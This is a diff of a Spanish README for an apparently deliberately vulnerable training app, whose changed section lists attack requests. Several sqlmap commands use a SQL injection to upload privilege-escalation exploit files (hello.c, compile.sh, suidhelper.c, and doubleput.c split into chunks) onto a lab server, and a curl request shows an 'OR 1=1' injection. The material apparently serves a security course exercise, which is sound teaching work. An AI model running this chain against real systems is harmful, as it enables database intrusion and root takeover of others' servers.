@@ -12,13 +12,21 @@ Se debe tener corriendo una base de datos mysql y ejecutar los scripts que estan
 
 ## Requests que explotan vulnerabilidades
 
-sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/hello.c --file-dest=/var/lib/mysql-files/hello.c
+sqlmap -u http://192.168.0.110:8080/users/123?id=1 --file-write=/root/Documentos/AppVulnerable/exploit/compile.sh --file-dest=/var/lib/mysql-files/compile.sh
 
-sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/compile.sh --file-dest=/var/lib/mysql-files/compile.sh
+sqlmap -u http://192.168.0.110:8080/users/123?id=1 --file-write=/root/Documentos/AppVulnerable/exploit/hello.c --file-dest=/var/lib/mysql-files/hello.c
 
-sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/suidhelper.c --file-dest=/var/lib/mysql-files/suidhelper.c
+sqlmap -u http://192.168.0.110:8080/users/123?id=1 --file-write=/root/Documentos/AppVulnerable/exploit/suidhelper.c --file-dest=/var/lib/mysql-files/suidhelper.c
 
-sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/doubleput.c --file-dest=/var/lib/mysql-files/doubleput.c
+#Partición del archivo doubleput.c
+
+split  doubleput.c -b 2KB
+
+sqlmap -u http://192.168.0.110:8080/users/123?id=1 --file-write=/root/Documentos/AppVulnerable/exploit/xaa --file-dest=/var/lib/mysql-files/xaa
+sqlmap -u http://192.168.0.110:8080/users/123?id=1 --file-write=/root/Documentos/AppVulnerable/exploit/xab --file-dest=/var/lib/mysql-files/xab
+sqlmap -u http://192.168.0.110:8080/users/123?id=1 --file-write=/root/Documentos/AppVulnerable/exploit/xac --file-dest=/var/lib/mysql-files/xac
+
+
 
 - curl -X GET localhost:8080/users?id=6%20OR%201=1
 	- id es un campo vulnerable a sql injection
